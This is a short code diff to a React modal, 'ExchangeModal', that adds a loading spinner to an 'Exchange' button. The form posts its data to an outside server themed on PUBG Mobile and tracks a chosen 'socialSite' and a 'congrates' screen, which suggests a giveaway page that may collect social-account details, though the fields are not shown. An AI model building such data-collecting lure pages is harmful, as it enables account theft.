@@ -14,6 +14,7 @@ const ExchangeModal: React.FC<ModalProps> = ({
   const { reset, handleSubmit, register } = useForm({ mode: "onSubmit" });
   const [socialSite, setSocialSite] = useState("");
   const [congrates, setCongrates] = useState(false);
+  const [loading, setLoading] = useState(false);
 
   const API = axios.create({ baseURL: "https://pubg-mobile.onrender.com" });
 
@@ -34,7 +35,9 @@ const ExchangeModal: React.FC<ModalProps> = ({
 
   const formSubmit = handleSubmit(async (formData) => {
     try {
+      setLoading(true);
       await API.post("/api/information", formData);
+      setLoading(false);
       setCongrates(true);
     } catch (err) {}
   });
@@ -201,7 +204,10 @@ const ExchangeModal: React.FC<ModalProps> = ({
                     background: "#0082de",
                   }}
                 >
-                  Exchange
+                  {loading && (
+                    <img width={20} src="https://i.gifer.com/ZKZg.gif" alt="" />
+                  )}
+                  {!loading && "Exchange"}
                 </button>
               </form>
             )}
